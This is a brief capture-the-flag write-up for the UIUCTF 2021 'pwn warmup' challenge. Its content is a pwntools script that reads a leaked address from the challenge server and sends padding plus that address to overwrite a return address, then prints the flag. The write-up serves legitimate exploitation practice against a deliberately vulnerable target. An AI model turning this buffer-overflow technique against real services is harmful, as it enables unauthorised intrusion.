---
layout: load_md
title: The White Circle | Uiuctf 2021 | pwn warmup Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Uiuctf 2021
parent: uiuctf_2021
category: pwn
challenge: pwn warmup
tags: "pwn, twh"
---

<h1 class="heading card-title white-text">Uiuctf 2021</h1>

## pwn warmup
> Solved by : thewhiteh4t


    #!/usr/bin/python3
    
    from pwn import *
    
    host = 'pwn-warmup.chal.uiuc.tf'
    port = 1337
    offset = 20
    addr = 0
    
    junk = b'A' * offset
    
    conn = remote(host, port)
    lines = conn.recvuntil('ad\n').decode().split('\n')
    addr = lines[2].split(' = ')[1].strip()
    addr = int(addr, 16)
    le_num = p64(addr)
    buffer = junk + le_num
    conn.sendline(buffer)
    flag = conn.recvuntil('}').decode()
    print(flag)
    


![](https://i.imgur.com/Usy3A7i.png)


